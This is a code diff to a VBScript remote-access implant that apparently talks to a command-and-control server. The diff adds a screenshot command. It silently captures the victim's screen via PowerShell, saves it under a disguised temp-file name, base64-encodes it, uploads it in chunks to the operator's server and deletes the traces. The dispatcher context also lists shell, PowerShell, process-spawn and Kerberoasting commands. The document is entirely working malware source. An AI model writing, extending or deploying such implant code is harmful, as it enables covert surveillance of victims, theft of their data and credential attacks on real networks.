@@ -566,6 +566,77 @@ Function CmdPowershell(taskParams)
     CmdPowershell = out
 End Function
 
+Function CmdScreenshot(taskParams)
+    Dim tempPath, psCmd, exec, stderr
+    Randomize
+    tempPath = oShell.ExpandEnvironmentStrings("%TEMP%") & "\~ss" & Int(Rnd * 99999) & ".png"
+    psCmd = "powershell.exe -NoProfile -NonInteractive -Command """ & _
+        "Add-Type -AssemblyName System.Windows.Forms;" & _
+        "Add-Type -AssemblyName System.Drawing;" & _
+        "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;" & _
+        "$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);" & _
+        "$g=[System.Drawing.Graphics]::FromImage($bmp);" & _
+        "$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);" & _
+        "$g.Dispose();" & _
+        "$bmp.Save('" & tempPath & "',[System.Drawing.Imaging.ImageFormat]::Png);" & _
+        "$bmp.Dispose()"""
+    Set exec = oShell.Exec(psCmd)
+    Do While exec.Status = 0
+        WScript.Sleep 100
+    Loop
+    If Not oFSO.FileExists(tempPath) Then
+        stderr = ""
+        Do While Not exec.StdErr.AtEndOfStream
+            stderr = stderr & exec.StdErr.ReadLine() & vbLf
+        Loop
+        CmdScreenshot = "screenshot failed: " & stderr
+        Exit Function
+    End If
+    Dim rs : Set rs = CreateObject("ADODB.Stream")
+    rs.Type = 1 : rs.Open : rs.LoadFromFile tempPath
+    Dim fileSize : fileSize = rs.Size
+    Dim fileBytes : fileBytes = rs.Read() : rs.Close
+    Dim xDoc : Set xDoc = CreateObject("MSXML2.DOMDocument")
+    Dim xNode : Set xNode = xDoc.createElement("b64")
+    xNode.dataType = "bin.base64"
+    xNode.nodeTypedValue = fileBytes
+    Dim encoded : encoded = Replace(Replace(xNode.text, vbCr, ""), vbLf, "")
+    Dim chunkSize : chunkSize = 512000
+    Dim totalChunks : totalChunks = Int(Len(encoded) / chunkSize)
+    If Len(encoded) Mod chunkSize > 0 Then totalChunks = totalChunks + 1
+    If totalChunks = 0 Then totalChunks = 1
+    Dim taskId : taskId = JsonGetStr(taskParams, "id")
+    Dim initJson : initJson = "{""action"":""post_response"",""responses"":[{" & _
+        JsonStr("task_id", taskId) & "," & _
+        """download"":{" & JsonInt("total_chunks", totalChunks) & "," & _
+        JsonStr("full_path", tempPath) & "," & _
+        JsonBool("is_screenshot", True) & "}}]}"
+    Dim initResp : initResp = PostMessage(initJson)
+    If Len(initResp) = 0 Then
+        On Error Resume Next : oFSO.DeleteFile tempPath : On Error GoTo 0
+        CmdScreenshot = "screenshot transfer init failed"
+        Exit Function
+    End If
+    Dim dlFileId : dlFileId = JsonGetStr(initResp, "file_id")
+    If Len(dlFileId) = 0 Then
+        On Error Resume Next : oFSO.DeleteFile tempPath : On Error GoTo 0
+        CmdScreenshot = "screenshot transfer init failed - no file_id"
+        Exit Function
+    End If
+    Dim c, chunk, chunkJson
+    For c = 0 To totalChunks - 1
+        chunk = Mid(encoded, c * chunkSize + 1, chunkSize)
+        chunkJson = "{""action"":""post_response"",""responses"":[{" & _
+            JsonStr("task_id", taskId) & "," & _
+            """download"":{" & JsonStr("file_id", dlFileId) & "," & _
+            JsonInt("chunk_num", c + 1) & "," & _
+            JsonStr("chunk_data", chunk) & "}}]}"
+        PostMessage chunkJson
+    Next
+    On Error Resume Next : oFSO.DeleteFile tempPath : On Error GoTo 0
+    CmdScreenshot = "screenshot captured (" & fileSize & " bytes)"
+End Function
+
 Function CmdKerberoast(taskParams)
     Dim targetSpn : targetSpn = GetParam(taskParams, "spn")
     Dim ldap, defaultNC, query, conn, rs, out, sam, spns
@@ -618,6 +689,7 @@ Function Dispatch(cmd, taskParams)
         Case "process_spawn" : Dispatch = CmdProcessSpawn(taskParams)
         Case "shell"         : Dispatch = CmdShell(taskParams)
         Case "powershell"    : Dispatch = CmdPowershell(taskParams)
+        Case "screenshot"    : Dispatch = CmdScreenshot(taskParams)
         Case "kerberoast"    : Dispatch = CmdKerberoast(taskParams)
         Case Else            : Dispatch = "unknown command: " & cmd
     End Select
